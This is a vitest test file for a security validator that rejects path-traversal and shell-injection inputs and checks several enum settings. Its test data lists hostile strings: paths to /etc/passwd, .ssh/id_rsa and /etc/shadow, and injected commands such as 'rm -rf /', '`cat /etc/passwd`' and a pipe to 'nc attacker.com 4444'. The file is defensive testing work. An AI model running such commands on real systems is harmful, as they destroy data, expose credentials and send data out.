/**
 * Security Validation Tests
 *
 * Tests for security vulnerabilities:
 * - CWE-22: Path Traversal
 * - CWE-78: Command Injection
 * - Input Validation
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  SecurityValidator,
  validateRoute,
  validateClarificationsStrategy,
  validateImplementationScope,
} from '../security.js';
import { tmpdir } from 'os';
import { join } from 'path';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;
  let allowedPath: string;

  beforeEach(() => {
    allowedPath = process.cwd();
    validator = new SecurityValidator([allowedPath]);
  });

  describe('Path Traversal Protection (CWE-22)', () => {
    it('should allow valid paths within workspace', () => {
      const validPath = allowedPath;
      expect(() => validator.validateDirectory(validPath)).not.toThrow();
    });

    it('should reject path traversal attempts with ../', () => {
      const maliciousPaths = [
        '../../../../etc',
        '../../../.ssh',
        join(allowedPath, '../../../etc/passwd'),
        '../../..',
      ];

      for (const path of maliciousPaths) {
        expect(() => validator.validateDirectory(path)).toThrow(/outside allowed workspace/);
      }
    });

    it('should reject absolute paths outside workspace', () => {
      const outsidePaths = ['/etc/passwd', '/var/log', '/tmp/../etc/passwd', tmpdir()];

      for (const path of outsidePaths) {
        expect(() => validator.validateDirectory(path)).toThrow(/outside allowed workspace/);
      }
    });

    it('should normalize paths before validation', () => {
      const weirdPath = join(allowedPath, './subdir/../');
      expect(() => validator.validateDirectory(weirdPath)).not.toThrow();
    });

    it('should reject paths with null bytes', () => {
      const nullBytePath = '/tmp\x00/etc/passwd';
      // Path normalization will likely handle this, but test anyway
      expect(() => validator.validateDirectory(nullBytePath)).toThrow();
    });
  });

  describe('Command Injection Protection (CWE-78)', () => {
    it('should reject paths with shell metacharacters', () => {
      const shellMetachars = [
        '$(whoami)',
        '`cat /etc/passwd`',
        '/tmp; rm -rf /',
        '/tmp && cat /etc/passwd',
        '/tmp | nc attacker.com 4444',
        '/tmp > /dev/null',
        '/tmp < /etc/passwd',
        '/tmp\\; malicious',
        '/tmp{a,b}',
        '/tmp[0-9]',
        '/tmp$USER',
        '/tmp!test',
      ];

      for (const path of shellMetachars) {
        expect(() => validator.validateDirectory(path)).toThrow(/shell metacharacters/);
      }
    });

    it('should sanitize shell input', () => {
      const dangerous = '$(rm -rf /)';
      const sanitized = validator.sanitizeShellInput(dangerous);
      expect(sanitized).not.toContain('$');
      expect(sanitized).not.toContain('(');
      expect(sanitized).not.toContain(')');
    });
  });

  describe('File Path Validation', () => {
    it('should validate files within allowed directory', () => {
      const validFile = validator.validateFilePath(allowedPath, 'file.txt');
      expect(validFile).toContain('file.txt');
    });

    it('should reject file paths that escape directory', () => {
      const escapePaths = ['../../../etc/passwd', '../../.ssh/id_rsa', '../etc/shadow'];

      for (const filePath of escapePaths) {
        expect(() => validator.validateFilePath(allowedPath, filePath)).toThrow(
          /escapes directory/
        );
      }
    });

    it('should reject file names with shell metacharacters', () => {
      const dangerousFiles = ['$(whoami).txt', 'file`cmd`.txt', 'file;rm -rf /.txt'];

      for (const fileName of dangerousFiles) {
        expect(() => validator.validateFilePath(allowedPath, fileName)).toThrow(
          /shell metacharacters/
        );
      }
    });
  });
});

describe('Route Validation', () => {
  it('should accept valid routes', () => {
    expect(validateRoute('greenfield')).toBe('greenfield');
    expect(validateRoute('brownfield')).toBe('brownfield');
  });

  it('should accept null/undefined', () => {
    expect(validateRoute(null)).toBe(null);
    expect(validateRoute(undefined)).toBe(null);
  });

  it('should reject invalid routes', () => {
    const invalidRoutes = [
      'invalid',
      'GREENFIELD',
      'green field',
      'greyfield',
      '../../etc',
      '$(whoami)',
    ];

    for (const route of invalidRoutes) {
      expect(() => validateRoute(route)).toThrow(/Invalid route/);
    }
  });

  it('should reject non-string routes', () => {
    expect(() => validateRoute(123 as any)).toThrow(/expected string/);
    expect(() => validateRoute({} as any)).toThrow(/expected string/);
    expect(() => validateRoute([] as any)).toThrow(/expected string/);
  });
});

describe('Clarifications Strategy Validation', () => {
  it('should accept valid strategies', () => {
    expect(validateClarificationsStrategy('defer')).toBe('defer');
    expect(validateClarificationsStrategy('prompt')).toBe('prompt');
    expect(validateClarificationsStrategy('skip')).toBe('skip');
  });

  it('should reject invalid strategies', () => {
    const invalidStrategies = ['invalid', 'DEFER', 'ask', '../../etc'];

    for (const strategy of invalidStrategies) {
      expect(() => validateClarificationsStrategy(strategy)).toThrow(
        /Invalid clarifications_strategy/
      );
    }
  });

  it('should reject non-string strategies', () => {
    expect(() => validateClarificationsStrategy(123 as any)).toThrow(/expected string/);
  });
});

describe('Implementation Scope Validation', () => {
  it('should accept valid scopes', () => {
    expect(validateImplementationScope('none')).toBe('none');
    expect(validateImplementationScope('p0')).toBe('p0');
    expect(validateImplementationScope('p0_p1')).toBe('p0_p1');
    expect(validateImplementationScope('all')).toBe('all');
  });

  it('should reject invalid scopes', () => {
    const invalidScopes = ['invalid', 'P0', 'p1', '../../etc'];

    for (const scope of invalidScopes) {
      expect(() => validateImplementationScope(scope)).toThrow(/Invalid implementation_scope/);
    }
  });

  it('should reject non-string scopes', () => {
    expect(() => validateImplementationScope(123 as any)).toThrow(/expected string/);
  });
});
